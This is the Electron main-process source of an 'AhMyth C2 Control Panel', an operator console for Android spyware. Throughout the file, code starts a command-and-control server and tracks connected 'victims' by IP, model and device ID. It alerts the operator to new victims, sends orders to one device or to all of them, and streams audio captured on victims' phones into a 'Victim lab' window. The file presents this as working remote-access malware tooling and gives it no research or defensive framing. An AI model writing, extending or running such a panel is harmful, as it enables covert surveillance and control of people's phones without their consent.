"use strict";
/**
 * AhMyth C2 Control Panel -- Electron main process.
 *
 * Modern replacement for the AhMyth-Plus electron 9 main: no `remote` module,
 * no transparent/frameless chrome, contextIsolation on, and the socket.io
 * server lives in server.js so it can be smoke-tested with plain node.
 */
const { app, BrowserWindow, ipcMain, screen } = require("electron");
const path = require("path");

const { startServer } = require("./server.js");

const PRELOAD = path.join(__dirname, "preload.js");
const RENDERER = path.join(__dirname, "renderer");

let mainWin = null;
const labWins = new Map();   // victim sid -> BrowserWindow
let c2 = null;               // server handle

function winPrefs() {
  return {
    preload: PRELOAD,
    contextIsolation: true,
    nodeIntegration: false,
    sandbox: false,
  };
}

function sendAll(channel, payload) {
  for (const w of BrowserWindow.getAllWindows()) {
    if (!w.isDestroyed()) w.webContents.send(channel, payload);
  }
}

function pushVictims() {
  if (!mainWin || mainWin.isDestroyed() || !c2) return;
  const list = Array.from(c2.victims.values()).map((v) => ({
    sid: v.sid,
    ip: v.ip,
    model: v.info.model,
    manf: v.info.manf,
    release: v.info.release,
    id: v.info.id,
    connectedAt: v.connectedAt,
  }));
  mainWin.webContents.send("victims", list);
}

function notifyNewVictim(v) {
  try {
    const wa = screen.getPrimaryDisplay().workArea;
    const win = new BrowserWindow({
      width: 340, height: 92,
      x: wa.x + wa.width - 350, y: wa.y + wa.height - 102,
      frame: false, alwaysOnTop: true, resizable: false, skipTaskbar: true,
      webPreferences: winPrefs(),
    });
    win.loadFile(path.join(RENDERER, "notify.html"), {
      query: { model: v.info.model || "Android", id: v.info.id || "" },
    });
    setTimeout(() => { if (!win.isDestroyed()) win.close(); }, 4000);
  } catch (e) { /* popup is cosmetic */ }
}

function createWindow() {
  mainWin = new BrowserWindow({
    width: 1000, height: 660, minWidth: 780, minHeight: 500,
    title: "AhMyth C2 Control Panel",
    backgroundColor: "#0d1117",
    webPreferences: winPrefs(),
  });
  mainWin.loadFile(path.join(RENDERER, "index.html"));
  mainWin.on("closed", () => { mainWin = null; });
}

app.whenReady().then(() => {
  createWindow();
  app.on("activate", () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});

// ---------------------------------------------------------------------------
// IPC
// ---------------------------------------------------------------------------

ipcMain.on("listen", (_e, port) => {
  if (c2) { try { c2.stop(); } catch (_) {} c2 = null; }
  const p = parseInt(port, 10) || 42474;
  try {
    c2 = startServer({
      port: p,
      onLog: (line) => sendAll("log", line),
      onVictim: (v) => { pushVictims(); notifyNewVictim(v); },
      onVictimGone: () => pushVictims(),
      onEvent: (v, name, data) => {
        pushVictims();
        sendAll("event", { victim: v.sid, name, data });
      },
      onAudioChunk: (v, chunk) => {
        const lab = labWins.get(v.sid);
        if (lab && !lab.isDestroyed()) lab.webContents.send("audio", { victim: v.sid, chunk });
      },
      onAudioStop: (v, reason) => {
        const lab = labWins.get(v.sid);
        if (lab && !lab.isDestroyed()) lab.webContents.send("audio-stop", { victim: v.sid, reason });
      },
    });
    sendAll("listen-state", { listening: true, port: p });
  } catch (err) {
    sendAll("listen-state", {
      listening: false,
      error: String((err && err.message) || err),
    });
  }
});

ipcMain.on("order", (_e, arg) => {
  if (!c2) return;
  if (arg && arg.victim) c2.sendOrder(arg.victim, arg.payload);
  else c2.broadcastOrder(arg.payload);
});

ipcMain.on("open-lab", (_e, victimId) => {
  const existing = labWins.get(victimId);
  if (existing && !existing.isDestroyed()) { existing.focus(); return; }
  const lab = new BrowserWindow({
    width: 1200, height: 880, minWidth: 920, minHeight: 620,
    title: "Victim lab",
    backgroundColor: "#0d1117",
    webPreferences: winPrefs(),
  });
  labWins.set(victimId, lab);
  lab.loadFile(path.join(RENDERER, "lab.html"), { query: { v: victimId } });
  lab.on("closed", () => labWins.delete(victimId));
});
